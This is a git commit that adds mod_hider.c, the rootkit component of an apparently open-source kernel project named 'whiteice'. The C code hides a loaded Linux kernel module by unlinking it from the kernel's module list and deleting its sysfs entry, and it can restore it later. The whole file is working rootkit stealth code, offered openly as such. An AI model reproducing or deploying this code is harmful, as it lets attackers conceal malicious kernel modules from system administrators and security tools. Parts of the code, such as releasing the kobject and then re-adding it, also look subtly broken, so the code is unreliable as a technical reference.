c3506cb7b9005d693ea08d73efde08f80644aaf1
itsrealaitorfirmware <aitorcitomasa10@gmail.com>
2025-07-20 18:54:01 +0200

    Create mod_hider.c

---
+++ src/rootkit/mod_hider.c
@@ -0,0 +1,34 @@
+#include "defs.h"
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+
+extern struct list_head __this_module_list;
+static short is_hidden = 0;
+static struct list_head *prev_module;
+static struct kobject *saved_kobj;
+
+void hide_module(void) {
+    if (is_hidden) return;
+
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+
+    saved_kobj = THIS_MODULE->mkobj.kobj.parent;
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    kobject_put(&THIS_MODULE->mkobj.kobj);
+
+    is_hidden = 1;
+    printk(KERN_INFO "[whiteice:mod_hider] Module hidden\n");
+}
+
+/* Restaura el módulo visible */
+void show_module(void) {
+    if (!is_hidden) return;
+
+    list_add(&THIS_MODULE->list, prev_module);
+    kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj, "whiteice");
+
+    is_hidden = 0;
+    printk(KERN_INFO "[whiteice:mod_hider] Module revealed\n");
+}
